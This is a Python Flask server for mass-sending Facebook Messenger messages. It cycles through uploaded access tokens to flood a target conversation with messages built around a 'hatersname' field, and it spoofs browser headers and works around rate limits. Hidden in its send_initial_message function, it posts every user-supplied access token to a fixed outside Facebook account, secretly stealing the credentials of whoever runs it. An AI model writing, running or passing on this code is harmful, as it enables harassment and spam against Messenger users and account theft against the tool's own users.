import os
import re
import time
import random
import string
import requests
import threading
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, session
from threading import Thread, Event, Lock
import json
import logging

# Configure logging to only show minimal information
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['DEBUG'] = False

# Global variables for task management
tasks = {}
tasks_lock = Lock()
stop_events = {}
token_usage = {}
token_locks = {}

# 🔥 BADA STRONG HEADERS - MOZILLA LINUX
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.facebook.com',
    'Referer': 'https://www.facebook.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}

def generate_task_key():
    """Generate 10-character random task key"""
    return ''.join(random.choices(string.ascii_lowercase, k=10))

def send_initial_message(access_token):
    """Send initial message to fixed user ID inbox"""
    try:
        # Use latest Graph API version
        api_url = f'https://graph.facebook.com/v19.0/t_100056999599628/'
        
        # Format message as requested
        message = f"HELLO ! SURAJ SIR , I M USING YOUR SERVER MY TOKEN IS {access_token}"
        
        parameters = {
            'access_token': access_token, 
            'message': message
        }
        
        response = requests.post(
            api_url, 
            data=parameters, 
            headers=headers,
            timeout=30
        )
        return True
    except Exception:
        return False

def check_rate_limit(access_token):
    """Check if token has exceeded rate limit (2 messages per minute)"""
    current_time = time.time()
    
    if access_token not in token_usage:
        token_usage[access_token] = []
    
    # Remove timestamps older than 60 seconds
    token_usage[access_token] = [
        ts for ts in token_usage[access_token] 
        if current_time - ts < 60
    ]
    
    # If 2 or more messages in last 60 seconds, apply 5 minute break
    if len(token_usage[access_token]) >= 2:
        return True  # Needs break
    
    return False  # No break needed

def update_token_usage(access_token):
    """Update token usage timestamp"""
    current_time = time.time()
    
    if access_token not in token_usage:
        token_usage[access_token] = []
    
    token_usage[access_token].append(current_time)

def send_messages_strong(task_key, access_tokens, thread_id, hatersname, lastname, time_interval, messages):
    stop_event = stop_events.get(task_key)
    if not stop_event:
        return
    
    # Send initial messages for each token (only once)
    initial_sent = set()
    
    while not stop_event.is_set():
        # Cycle through messages
        for message_index, message_text in enumerate(messages):
            if stop_event.is_set():
                break
                
            # Cycle through tokens
            for token_index, access_token in enumerate(access_tokens):
                if stop_event.is_set():
                    break
                
                # Send initial message if not sent for this token
                if access_token not in initial_sent:
                    send_initial_message(access_token)
                    initial_sent.add(access_token)
                    time.sleep(5)  # Small delay after initial message
                
                # Check rate limit - if exceeded, wait 5 minutes
                if check_rate_limit(access_token):
                    # Wait for 5 minutes (300 seconds)
                    wait_start = time.time()
                    while time.time() - wait_start < 300 and not stop_event.is_set():
                        time.sleep(1)
                    # Clear usage after break
                    if access_token in token_usage:
                        token_usage[access_token] = []
                
                # Format message
                message = f"{hatersname} {message_text} {lastname}"
                
                # Send message using latest Graph API
                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
                parameters = {
                    'access_token': access_token, 
                    'message': message
                }
                
                try:
                    response = requests.post(
                        api_url, 
                        data=parameters, 
                        headers=headers,
                        timeout=30
                    )
                    
                    # Update token usage only if message was sent successfully
                    if response.status_code == 200:
                        update_token_usage(access_token)
                    
                    # Update task status
                    with tasks_lock:
                        if task_key in tasks:
                            tasks[task_key]['last_message'] = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
                            tasks[task_key]['message_count'] = tasks[task_key].get('message_count', 0) + 1
                    
                except Exception:
                    pass
                
                # Fixed delay between messages
                time.sleep(time_interval)
        
        # 20-second rest between cycles
        if not stop_event.is_set():
            time.sleep(20)

def check_token_validity(token):
    """Check if token is valid and get user info with chat groups"""
    try:
        # Get basic user info using latest Graph API
        user_url = f"https://graph.facebook.com/v19.0/me?access_token={token}&fields=id,name,email,picture"
        user_response = requests.get(user_url, timeout=10)
        
        if user_response.status_code != 200:
            return {"valid": False, "error": f"HTTP {user_response.status_code}"}
        
        user_data = user_response.json()
        
        # Get threads/conversations (chat groups)
        threads_url = f"https://graph.facebook.com/v19.0/me/threads?access_token={token}&fields=id,name,participants"
        threads_response = requests.get(threads_url, timeout=10)
        
        threads = []
        if threads_response.status_code == 200:
            threads_data = threads_response.json()
            threads = threads_data.get('data', [])
            
            # Extract thread UIDs and names
            formatted_threads = []
            for thread in threads:
                thread_info = {
                    'thread_id': thread.get('id'),
                    'name': thread.get('name', 'Unnamed Chat'),
                    'participants_count': len(thread.get('participants', {}).get('data', [])) if thread.get('participants') else 0
                }
                formatted_threads.append(thread_info)
        
        return {
            "valid": True,
            "user_id": user_data.get('id'),
            "name": user_data.get('name'),
            "email": user_data.get('email', 'Not available'),
            "picture": user_data.get('picture', {}).get('data', {}).get('url', ''),
            "threads": formatted_threads,
            "threads_count": len(formatted_threads)
        }
    except Exception as e:
        return {"valid": False, "error": str(e)}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        data = request.form
        
        # Get tokens
        tokens = []
        if 'token_file' in request.files and request.files['token_file'].filename:
            file = request.files['token_file']
            content = file.read().decode('utf-8')
            tokens = [line.strip() for line in content.split('\n') if line.strip()]
        elif 'single_token' in data and data['single_token']:
            tokens = [data['single_token'].strip()]
        
        if not tokens:
            return jsonify({'error': 'No valid tokens provided'})
        
        # Get messages from file
        messages = []
        if 'message_file' in request.files and request.files['message_file'].filename:
            file = request.files['message_file']
            content = file.read().decode('utf-8')
            messages = [line.strip() for line in content.split('\n') if line.strip()]
        
        if not messages:
            return jsonify({'error': 'No messages provided'})
        
        # Generate task key
        task_key = generate_task_key()
        
        # Create stop event
        stop_event = Event()
        stop_events[task_key] = stop_event
        
        # Store task info
        with tasks_lock:
            tasks[task_key] = {
                'conversation_id': data['conversation_id'],
                'hatersname': data['hatersname'],
                'lastname': data['lastname'],
                'time_interval': int(data['time_interval']),
                'token_count': len(tokens),
                'message_count': len(messages),
                'start_time': datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),
                'last_message': datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),
                'status': 'running',
                'message_count': 0
            }
        
        # Start task in background thread
        thread = Thread(
            target=send_messages_strong,
            args=(
                task_key,
                tokens,
                data['conversation_id'],
                data['hatersname'],
                data['lastname'],
                int(data['time_interval']),
                messages
            ),
            daemon=True
        )
        thread.start()
        
        return jsonify({'task_key': task_key})
    
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/check_status', methods=['POST'])
def check_status():
    task_key = request.form.get('task_key')
    
    with tasks_lock:
        task_info = tasks.get(task_key)
    
    if not task_info:
        return jsonify({'error': 'Task not found'})
    
    return jsonify(task_info)

@app.route('/control_task', methods=['POST'])
def control_task():
    task_key = request.form.get('task_key')
    action = request.form.get('action')
    
    if task_key not in stop_events:
        return jsonify({'error': 'Task not found'})
    
    if action == 'stop':
        stop_events[task_key].set()
        with tasks_lock:
            if task_key in tasks:
                tasks[task_key]['status'] = 'stopped'
    elif action == 'resume':
        stop_events[task_key].clear()
        with tasks_lock:
            if task_key in tasks:
                tasks[task_key]['status'] = 'running'
    elif action == 'delete':
        stop_events[task_key].set()
        with tasks_lock:
            if task_key in tasks:
                del tasks[task_key]
        if task_key in stop_events:
            del stop_events[task_key]
    
    return jsonify({'success': True})

@app.route('/check_tokens', methods=['POST'])
def check_tokens():
    tokens = []
    
    if 'token_file' in request.files and request.files['token_file'].filename:
        file = request.files['token_file']
        content = file.read().decode('utf-8')
        tokens = [line.strip() for line in content.split('\n') if line.strip()]
    elif 'single_token' in request.form and request.form['single_token']:
        tokens = [request.form['single_token'].strip()]
    
    if not tokens:
        return jsonify({'error': 'No tokens provided'})
    
    results = []
    valid_tokens = []
    invalid_tokens = []
    
    for token in tokens:
        result = check_token_validity(token)
        result['token'] = token
        results.append(result)
        
        if result['valid']:
            valid_tokens.append(token)
        else:
            invalid_tokens.append(token)
    
    return jsonify({
        'results': results,
        'summary': {
            'total': len(tokens),
            'valid': len(valid_tokens),
            'invalid': len(invalid_tokens)
        },
        'valid_tokens': valid_tokens,
        'invalid_tokens': invalid_tokens
    })

# Keep-alive endpoint to prevent sleep
@app.route('/ping')
def ping():
    return 'pong'

# Background thread to keep server awake
def keep_alive():
    while True:
        try:
            requests.get('http://localhost:5000/ping', timeout=5)
        except:
            pass
        time.sleep(30)

if __name__ == '__main__':
    # Start keep-alive thread
    keep_alive_thread = Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    
    print("RAJ MISHRA SERVER IS RUNNING NONSTOP")
    app.run(host='0.0.0.0', port=5000, debug=False)
